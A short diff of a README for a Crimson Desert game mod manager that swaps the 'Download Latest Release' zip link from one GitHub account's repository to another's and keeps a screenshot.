@@ -1,5 +1,5 @@
 ### Crimson Desert Ultimate Mods Manager
-## ![⬇️ Download Latest Release](https://github.com/SponsorConquer/Crimson-Desert-JSON-Mod-Manager/releases/download/ModManager/JSON.ModManager.V10.0.zip)
+## ![⬇️ Download Latest Release](https://github.com/ExecutorDrag/Crimson-Desert-Ultimate-Mods-Manager/releases/download/UltimateModsManager/Ultimate.Mods.Manager.-.CDUMM.zip)
 
 <img width="921" height="681" alt="Screenshot 2026-04-18 181830" src="https://github.com/user-attachments/assets/624519e6-7405-4114-9036-3c965ebbb81f" />
 
